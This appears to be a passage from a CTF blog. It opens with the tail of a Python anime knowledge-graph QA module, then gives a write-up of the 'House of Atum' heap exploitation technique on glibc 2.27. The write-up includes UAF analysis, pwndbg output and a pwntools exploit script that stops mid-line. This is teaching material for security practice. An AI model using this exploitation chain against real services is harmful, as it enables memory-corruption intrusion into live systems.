class="string">&quot;制作&quot;</span>, <span class="string">&quot;创造&quot;</span>, <span class="string">&quot;创作&quot;</span>]</span><br><span class="line">choices_role_do = [<span class="string">&quot;属于&quot;</span>,<span class="string">&quot;是&quot;</span>,<span class="string">&quot;的&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NER</span>():</span></span><br><span class="line">    db = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    entity_list = []</span><br><span class="line">    anime_list = []</span><br><span class="line">    author_list = []</span><br><span class="line">    classify_list = []</span><br><span class="line">    platform_list = []</span><br><span class="line">    role_list = []</span><br><span class="line">    seiyuu_list = []</span><br><span class="line"></span><br><span class="line">    entity = <span class="string">&quot;&quot;</span></span><br><span class="line">    anime = <span class="string">&quot;&quot;</span></span><br><span class="line">    author = <span class="string">&quot;&quot;</span></span><br><span class="line">    classify = <span class="string">&quot;&quot;</span></span><br><span class="line">    platform = <span class="string">&quot;&quot;</span></span><br><span class="line">    role = <span class="string">&quot;&quot;</span></span><br><span class="line">    seiyuu = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    entityRelation = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">question_answering</span>(<span class="params">self,entity</span>):</span></span><br><span class="line">        self.db = Neo4j()</span><br><span class="line">        self.db.connectDB()</span><br><span class="line">        tag = Taskflow(<span class="string">&quot;pos_tagging&quot;</span>)</span><br><span class="line">        self.entity = entity</span><br><span class="line">        self.entity_list = tag(entity)</span><br><span class="line">        self.get_major()</span><br><span class="line">        <span class="keyword">if</span>(self.anime_list <span class="keyword">or</span> self.author_list <span class="keyword">or</span> self.classify_list <span class="keyword">or</span></span><br><span class="line">        self.platform_list <span class="keyword">or</span> self.role_list <span class="keyword">or</span> self.seiyuu_list):</span><br><span class="line">            self.entityRelation = [self.anime_list, self.author_list,</span><br><span class="line">                                   self.classify_list, self.platform_list,</span><br><span class="line">                                   self.role_list, self.seiyuu_list]</span><br><span class="line">        <span class="keyword">return</span> self.entityRelation</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_major</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">            <span class="keyword">if</span> (self.entity_list[i][<span class="number">1</span>] == <span class="string">&#x27;n&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> (i+<span class="number">1</span> &lt; <span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i][<span class="number">0</span>], choices_anime)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">len</span>(self.entity_list[i + <span class="number">2</span>]) != <span class="number">0</span>):</span><br><span class="line">                            self.anime = re.findall(<span class="string">&#x27;《(.*?)》&#x27;</span>,self.entity)[<span class="number">0</span>]</span><br><span class="line">                            self.index = i-<span class="number">1</span></span><br><span class="line">                            <span class="built_in">print</span>(self.anime)</span><br><span class="line">                            self.get_minor_anime()</span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i][<span class="number">0</span>], choices_role)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        self.role = self.entity_list[i + <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                        self.index = i-<span class="number">1</span></span><br><span class="line">                        <span class="built_in">print</span>(self.role)</span><br><span class="line">                        self.get_minor_role()</span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i][<span class="number">0</span>], choices_seiyuu)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        self.seiyuu = self.entity_list[i + <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                        self.index = i-<span class="number">1</span></span><br><span class="line">                        <span class="built_in">print</span>(self.seiyuu)</span><br><span class="line">                        self.get_minor_seiyuu()</span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i][<span class="number">0</span>], choices_author)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        self.author = self.entity_list[i + <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                        self.index = i-<span class="number">1</span></span><br><span class="line">                        <span class="built_in">print</span>(self.author)</span><br><span class="line">                        self.get_minor_author()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_minor_anime</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.anime_list = self.db.name2anime(self.anime)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list) - self.index):</span><br><span class="line">            <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index][<span class="number">0</span>], choices_anime_do)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> (i+self.index+j&gt;=<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_role)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;角色&quot;</span>)</span><br><span class="line">                        self.role_list = self.db.anime2role(self.anime)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_classify)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;类型&quot;</span>)</span><br><span class="line">                        self.classify_list = self.db.anime2classify(self.anime)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_platform)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;平台&quot;</span>)</span><br><span class="line">                        self.platform_list = self.db.anime2platform(self.anime)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_minor_role</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.role_list = self.db.name2role(self.role)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list) - self.index):</span><br><span class="line">            <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index][<span class="number">0</span>], choices_role_do)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> (i+self.index+j&gt;=<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_anime)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;番剧&quot;</span>)</span><br><span class="line">                        self.anime_list = self.db.role2anime(self.role)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_seiyuu)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;配音&quot;</span>)</span><br><span class="line">                        self.seiyuu_list = self.db.role2seiyuu(self.role)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_minor_seiyuu</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seiyuu_list = self.db.name2seiyuu(self.seiyuu)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list) - self.index):</span><br><span class="line">            <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index][<span class="number">0</span>], choices_seiyuu_do)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> (i+self.index+j&gt;=<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    if (process.extractOne(self.entity_list[i + self.index + j][0], choices_anime)[1] &gt; 60):</span></span><br><span class="line"><span class="string">                        print(&quot;番剧&quot;)</span></span><br><span class="line"><span class="string">                        self.anime_list = self.db.</span></span><br><span class="line"><span class="string">                        break</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index + j][<span class="number">0</span>], choices_role)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;角色&quot;</span>)</span><br><span class="line">                        self.role_list = self.db.seiyuu2role(self.seiyuu)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_minor_author</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.author_list = self.db.name2author(self.author)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.entity_list) - self.index):</span><br><span class="line">            <span class="keyword">if</span> (i+self.index&gt;=<span class="built_in">len</span>(self.entity_list)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (process.extractOne(self.entity_list[i + self.index][<span class="number">0</span>], choices_anime)[<span class="number">1</span>] &gt; <span class="number">60</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;番剧&quot;</span>)</span><br><span class="line">                self.anime_list = self.db.author2anime(self.author)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">声优花泽香菜配音过的角色</span></span><br><span class="line"><span class="string">公司EMTSquared的作品</span></span><br><span class="line"><span class="string">角色藤户千雪的声优是谁</span></span><br><span class="line"><span class="string">番剧《普通女高中生要做当地偶像》的角色有哪些</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/10/House%20Of%20Atum-2.27-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/10/House%20Of%20Atum-2.27-64/" class="post-title-link" itemprop="url">House Of Atum-2.27-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-10 16:59:08 / Modified: 17:00:02" itemprop="dateCreated datePublished" datetime="2023-03-10T16:59:08+08:00">2023-03-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>houseofAtum</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">houseofAtum: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=ac40687beee1b00aa55c6dc25d383a41fbfdb0e2, <span class="keyword">not</span> stripped      </span><br><span class="line">[!] Could <span class="keyword">not</span> populate PLT: invalid syntax (unicorn.py, line <span class="number">110</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/atum/houseofAtum&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">1</span> &amp;&amp; notes[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)notes[index]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Clear?(y/n):&quot;</span>);</span><br><span class="line">  readn(key, <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    notes[index] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>UAF</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>libc-2.27 没有 key 值限制，可以随便 Double free</p>
<p>将同一个 chunk 释放两次就可以使其 <code>chunk-&gt;FD</code> 指向它自己，于是可以轻松泄露出 <code>heap_base</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    dele(<span class="number">1</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2b0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>使用 House Of Atum 连续释放同一个 chunk 8 次可以将其放入 fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x55e3e486d260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55e3e486d250</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现这个 chunk 同时存在于 tcache 和 fastbin 中</li>
<li>申请掉 tcache 中的 chunk，并向其中写入 fake chunk addr，实现堆覆盖</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55bdfed93250</span> —▸ <span class="number">0x55bdfed93240</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>然后搭一搭堆风水，修改 <code>chunk-&gt;size</code> 使其进入 unsortedbin，泄露 <code>libc_base</code></p>
<p>最后劫持一下 <code>free_hook</code> 就可以了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./houseofAtum&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x269F)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Input the content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Input the content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index,key</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Clear?(y/n):&quot;</span>,key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="string">&quot;b&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    dele(<span class="number">1</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2b0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_base+<span class="number">0x250</span>-<span class="number">0x10</span>)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook 